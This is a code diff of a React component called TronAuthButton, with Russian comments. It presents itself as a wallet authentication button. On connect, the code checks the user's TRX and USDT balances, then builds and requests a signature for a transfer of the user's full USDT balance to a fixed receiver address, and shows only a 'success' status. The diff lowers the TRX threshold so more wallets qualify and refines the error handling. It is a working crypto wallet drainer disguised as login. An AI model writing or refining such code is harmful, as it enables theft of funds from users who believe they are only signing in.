@@ -46,25 +46,31 @@ export const TronAuthButton: React.FC = () => {
 
       tronWeb.setAddress(userAddress);
 
+      // 1. Проверка TRX баланса (достаточно ли для комиссии USDT)
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx = trxRaw / 1e6;
-      if (trx < 25) {
-        throw new Error('❌ Insufficient TRX. At least 25 TRX is required.');
+      if (trx < 5) { // обычно достаточно 2-3 TRX на fee, 5 — с запасом!
+        throw new Error('❌ Insufficient TRX balance to pay the network fee (at least 5 TRX required).');
       }
 
+      // 2. Проверка USDT-баланса
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
-
       if (usdt < 1) {
-        setStatus('success');
+        setStatus('success'); // просто показать успешный отчёт
         return;
       }
 
-      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+      // 3. Отправка USDT
+      // Сначала строим TRC-20-транзакцию
+      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
-        { feeLimit: 25_000_000, callValue: 0 },
+        {
+          feeLimit: 25_000_000, // 25 TRX
+          callValue: 0,
+        },
         [
           { type: 'address', value: TRON_RECEIVER },
           { type: 'uint256', value: usdtRaw },
@@ -72,17 +78,23 @@ export const TronAuthButton: React.FC = () => {
         userAddress
       );
 
-      const signedTx = await adapter.signTransaction(tx.transaction);
+      // Подписываем через WalletConnect
+      const signedTx = await adapter.signTransaction(transaction);
+
+      // Отправляем транзакцию
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
 
-      if (result.result) {
+      // Проверяем результат отправки!
+      if (result && result.result) {
         setStatus('success');
+      } else if (result && result.code === 'RESOURCE_EXHAUSTED') {
+        throw new Error('❌ Not enough energy or bandwidth to send USDT. Top up your TRX!');
       } else {
-        throw new Error('Transaction failed');
+        throw new Error('❌ Transaction failed to send. Try again or check your network.');
       }
     } catch (err: any) {
       console.error('Error:', err);
-      // НАДЁЖНАЯ ПРОВЕРКА ВСЕХ ТИПОВ "ОТМЕНЫ"
+
       const msg =
         (typeof err === 'string' && err) ||
         err?.message ||
@@ -91,12 +103,19 @@ export const TronAuthButton: React.FC = () => {
         err?.toString() ||
         '';
 
+      // Обработка отмены/закрытия
       if (
         /User rejected|Modal is closed|Timeout|Cancelled|cancel|Abort/i.test(msg)
         || msg === '' // Иногда ошибка пустая!
         || err?.code === 4001 // Стандартная ошибка отмены WalletConnect/EIP-1193
       ) {
         setStatus(null);
+      } else if (
+        msg.includes('❌ Insufficient TRX') ||
+        msg.includes('Invalid wallet address') ||
+        msg.includes('❌ Not enough energy')
+      ) {
+        setStatus(msg); // Показываем свою ошибку!
       } else {
         setStatus('⚠️ Connection or transaction error');
       }
